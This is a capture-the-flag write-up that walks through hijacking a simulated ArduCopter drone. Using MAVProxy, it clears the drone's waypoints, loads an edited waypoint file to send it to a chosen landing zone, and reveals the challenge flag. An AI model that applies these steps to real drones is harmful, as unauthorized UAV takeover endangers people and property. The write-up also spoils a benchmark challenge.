# MAVLink Phantom UAV Takeover CTF Challenge - Writeup

## Challenge Overview

**Name:** Phantom UAV Takeover - Operation Sky Recon Intercept  
**Platform:** HackTheBox Global Cyber Benchmark 2025  
**Category:** Hardware  
**Difficulty:** Medium  
**Objective:** Intercept and redirect an enemy surveillance drone to a secure landing zone before it transmits intelligence data  
**Flag:** `HTB{ph4nt0m_u4v_t4k3_0v3r}`

### Target Details
- MAVLink endpoint: `tcp:83.136.252.21:31749`
- Web interface: `http:83.136.252.21:40088`
- Secure landing zone: `-35.36276, 149.165771`
- Protocol: MAVLink over TCP

## Tools Required

- **MAVProxy** - MAVLink ground station software
- **Text editor** - For waypoint file manipulation
- **Web browser** - To check web interface (optional)

### Installation
```bash
# Install MAVProxy
pip install mavproxy
# Or using uv
uv pip install mavproxy
```

## Discovery Phase

### Initial Connection
Connected to the drone and discovered it was running ArduCopter in SITL mode:
```bash
mavproxy.py --master=tcp:83.136.252.21:31749

# Output revealed:
# AP: ArduCopter V4.7.0-dev (5b498fca)
# AP: sitl-unknown-0
# Frame: QUAD/X
```

### Mission Analysis
Checked current mission status:
```bash
wp list
# Result: 1 waypoint at -35.3534999, 149.2344001
# Drone was flying an octagonal patrol pattern
```

## The Challenge

Standard MAVLink navigation commands failed with "No click position available" error:
```bash
guided -35.36276 149.165771 50        # Failed
wp add -35.36276 149.165771 50        # Failed  
position -35.36276 149.165771 0       # Failed
```

This indicated MAVProxy expected GUI/map click input rather than command-line coordinates.

## Solution

### Step 1: Export Current Waypoints
```bash
wp list
```
This command displayed the current waypoint AND saved it to `way.txt`

### Step 2: Clear Existing Mission
```bash
wp clear
```

### Step 3: Edit Waypoint File
Exited MAVProxy and edited `way.txt` to change coordinates:
- Original: `-35.3534999 149.2344001`
- Changed to: `-35.36276 149.165771` (secure landing zone)

### Step 4: Load Modified Waypoints
```bash
wp load way.txt
```

### Step 5: Execute Mission
```bash
mode auto
```
The drone began flying to the new waypoint at the secure landing zone.

### Step 6: Land and Capture Flag
```bash
mode land
```
Upon landing in the RF jamming zone, the flag was revealed: `HTB{ph4nt0m_u4v_t4k3_0v3r}`

## Key Insights

1. **File-based Input Bypass**: When GUI input is required, file manipulation can provide an alternative attack vector
2. **Waypoint Persistence**: MAVProxy's `wp list` command automatically saves waypoints to a file
3. **Mission Override**: Clearing and reloading waypoints effectively hijacks the drone's mission
4. **Protocol Knowledge**: Understanding MAVLink waypoint management was crucial

## Lessons Learned

- **Think Outside the GUI**: Command-line tools may have file-based alternatives to graphical interfaces
- **Check Auto-save Features**: Commands that display data often save it to files as well
- **Simple Solutions Work**: File editing bypassed complex MAVLink command requirements
- **Mission Planning Vulnerabilities**: Autonomous systems that accept waypoint updates can be redirected

This challenge demonstrated a realistic drone hijacking scenario where understanding the tool's file I/O behavior provided the winning approach when direct commands failed.